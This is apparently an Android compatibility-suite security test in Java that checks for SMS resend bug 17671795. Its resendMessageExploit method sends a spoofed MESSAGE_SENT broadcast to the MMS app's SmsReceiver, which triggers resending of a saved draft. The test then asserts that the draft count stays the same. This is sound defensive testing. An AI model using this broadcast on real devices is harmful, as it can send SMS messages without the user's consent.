/*
 * Copyright (C) 2016 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.smsresendtest.cts;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.test.AndroidTestCase;

public class SMSResendVulnerability extends AndroidTestCase {

    public void createAndSaveDraftMessage() {
        Intent intent = new Intent("android.intent.action.SENDTO");
        intent.setData(Uri.parse("smsto:9999999999"));
        intent.putExtra("sms_body", "Draft for ANDROID BUG - 17671795");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        getContext().startActivity(intent);

        /**
         * Wait for the default SMS application to launch and display the draft message.
         */
        SystemClock.sleep(2500);

        /**
         * Get back to home launcher screen to save the draft message.
         */
        Intent intentToHome = new Intent(Intent.ACTION_MAIN);
        intentToHome.addCategory(Intent.CATEGORY_HOME);
        intentToHome.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        getContext().startActivity(intentToHome);

        /**
         * Wait for draft message to get saved (it takes time).
         */
        SystemClock.sleep(1000);
    }

    public void resendMessageExploit() {
        Intent intent = new Intent("com.android.mms.transaction.MESSAGE_SENT");
        intent.setData(Uri.parse("content://sms"));
        intent.setClassName("com.android.mms", "com.android.mms.transaction.SmsReceiver");
        getContext().sendOrderedBroadcast(intent, null, null, null,
                SmsManager.RESULT_ERROR_RADIO_OFF, null, null);
    }

    public int getSMSDraftBoxSize() {
        ContentResolver resolver = mContext.getContentResolver();
        Cursor cur = resolver.query(Uri.parse("content://sms/draft"), null, null, null, null);
        int count = cur.getCount();
        cur.close();
        return count;
    }

    /**
     * Creates and saves a draft message on the device, then triggers the resend sms intent exploit.
     * On patched device, the draft sms will not be moved to sent folder (ensuring that the sms was
     * not resent).
     */
    public void testExecuteSMSResendVulnerability() {
        createAndSaveDraftMessage();
        int draftBox_size_before = getSMSDraftBoxSize();
        resendMessageExploit();
        SystemClock.sleep(1000);
        int draftBox_size_after = getSMSDraftBoxSize();
        assertTrue("Device is vulnerable to bug #17671795! For more information, refer - " +
                "https://android.googlesource.com/platform/packages/apps/Mms/+/afa733d%5E!/" ,
                draftBox_size_before == draftBox_size_after);
    }
}